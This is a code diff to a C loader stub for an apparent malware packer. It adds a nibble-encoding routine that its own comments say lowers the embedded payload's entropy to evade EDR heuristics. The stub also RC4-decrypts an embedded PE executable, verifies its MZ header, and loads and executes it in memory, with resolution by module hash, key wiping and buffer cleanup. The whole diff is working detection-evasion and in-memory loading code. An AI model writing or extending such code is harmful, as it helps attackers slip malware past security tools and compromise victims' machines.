@@ -171,6 +171,30 @@ static BYTE *_find_module(DWORD modHash) {
 
 
 /* ═══════════════════════════════════════════════════════════════════
+ * Nibble decode — reverse of entropy-reduction encoding
+ *
+ * The payload is stored with each ciphertext byte split into two
+ * bytes from the alphabet 'A'-'P' (0x41-0x50).  This keeps the
+ * .data section at entropy ≈ 4.0 instead of ≈ 8.0, avoiding
+ * EDR heuristics that flag high-entropy PE sections.
+ *
+ *   encoded[i*2]   = 0x41 + (byte >> 4)     high nibble
+ *   encoded[i*2+1] = 0x41 + (byte & 0x0F)   low nibble
+ * ═══════════════════════════════════════════════════════════════════ */
+
+static void _nibble_decode(const unsigned char *encoded, unsigned int enc_len,
+                           unsigned char *decoded) {
+    unsigned int i = 0;
+    while (i < enc_len) {
+        unsigned char hi = encoded[i]     - 0x41;
+        unsigned char lo = encoded[i + 1] - 0x41;
+        decoded[i >> 1] = (unsigned char)((hi << 4) | lo);
+        i += 2;
+    }
+}
+
+
+/* ═══════════════════════════════════════════════════════════════════
  * RC4 stream cipher
  * ═══════════════════════════════════════════════════════════════════ */
 
@@ -829,12 +853,27 @@ void _stub_entry(void) {
     unsigned char rc4_key[DERIVED_KEY_LEN];
     _derive_key(g_res_cfg, RES_CFG_SIZE, rc4_key, DERIVED_KEY_LEN);
 
+    /* Phase 2.5: Nibble-decode the payload (entropy ~4.0 → raw ciphertext)
+     * g_res_data is nibble-encoded (2x size), decode into a fresh buffer. */
+    SLOG("[stub] nibble decoding...");
+    unsigned char *decoded = (unsigned char *)api.pVirtualAlloc(
+        NULL, RES_DECODED_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!decoded) {
+        SLOG("[stub] FATAL: VirtualAlloc for decode buffer");
+#ifdef STUB_DEBUG
+        _dbg_close();
+#endif
+        api.pExitProcess(1);
+        return;
+    }
+    _nibble_decode(g_res_data, RES_DATA_SIZE, decoded);
+
     /* Phase 3: RC4 decrypt payload */
     SLOG("[stub] decrypting...");
     {
         unsigned char S[256];
         _rc4_init(S, rc4_key, DERIVED_KEY_LEN);
-        _rc4_crypt(S, g_res_data, RES_DATA_SIZE);
+        _rc4_crypt(S, decoded, RES_DECODED_SIZE);
     }
 
     /* Wipe key from stack */
@@ -844,25 +883,30 @@ void _stub_entry(void) {
     }
 
     /* Verify decryption (check MZ header) */
-    if (g_res_data[0] != 'M' || g_res_data[1] != 'Z') {
+    if (decoded[0] != 'M' || decoded[1] != 'Z') {
         SLOG("[stub] FATAL: bad MZ after decrypt");
 #ifdef STUB_DEBUG
         _dbg_close();
 #endif
+        api.pVirtualFree(decoded, 0, MEM_RELEASE);
         api.pExitProcess(1);
         return;  /* unreachable, but satisfies compiler */
     }
     SLOG("[stub] decrypt OK");
 
     /* Phase 4: Load and execute */
-    if (!_load_pe(g_res_data, RES_DATA_SIZE, &api)) {
+    if (!_load_pe(decoded, RES_DECODED_SIZE, &api)) {
         SLOG("[stub] FATAL: load failed");
 #ifdef STUB_DEBUG
         _dbg_close();
 #endif
+        api.pVirtualFree(decoded, 0, MEM_RELEASE);
         api.pExitProcess(1);
         return;
     }
+
+    /* Wipe and free the decoded PE buffer — it's mapped into sections now */
+    api.pVirtualFree(decoded, 0, MEM_RELEASE);
 
 #ifdef STUB_DEBUG
     _dbg_close();
